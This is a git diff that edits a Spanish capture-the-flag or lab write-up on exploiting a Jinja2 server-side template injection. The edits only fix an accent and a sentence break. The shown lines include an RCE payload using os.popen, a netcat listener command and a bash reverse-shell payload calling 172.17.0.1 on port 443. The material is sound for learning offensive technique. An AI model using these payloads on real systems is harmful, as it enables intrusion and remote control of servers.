@@ -58,7 +58,7 @@ Lo primero que se me ocurre es ver si es vulnerable a `SSTI`, una manera de comp
 
 <br>
 
-Como observamos es vulnerable a SSTI por lo que deberíamos hacer ahora es buscar un payload el cual nos permita ejecutar comando de forma remota (RCE), por ejemplo en este [repositorio](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection) encontramos un monton de payloads pero el que nos interesa a nosotros es el de **Jinja2** que sería algo así: <br>
+Como observamos es vulnerable a SSTI por lo que deberíamos hacer ahora es buscar un payload el cual nos permita ejecutar comando de forma remota (RCE), por ejemplo en este [repositorio](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection) encontramos un montón de payloads pero el que nos interesa a nosotros es el de **Jinja2** que sería algo así: <br>
 
 `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` 
 <br> 
@@ -70,7 +70,8 @@ Al introducir lo anterior comprobamos que nos responde con lo siguiente:
 
 <br>
 
-Por lo que ahora nos mandaríamos una revshell, este parte se puede hacer de muchas formas. Una de ellas sería ponernos en escucha con netcat, escribiendo en nuestra terminal `nc -nlvp 443`, y despues e el payload en vez de poner el comando `id`, nos mandaremos una revshell poniendo lo siguiente: <br>
+Por lo que ahora nos mandaríamos una revshell. Este parte se puede hacer de muchas formas. <br>
+Una de ellas sería ponernos en escucha con netcat, escribiendo en nuestra terminal `nc -nlvp 443`, y despues e el payload en vez de poner el comando `id`, nos mandaremos una revshell poniendo lo siguiente: <br>
 
 `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}` 
 
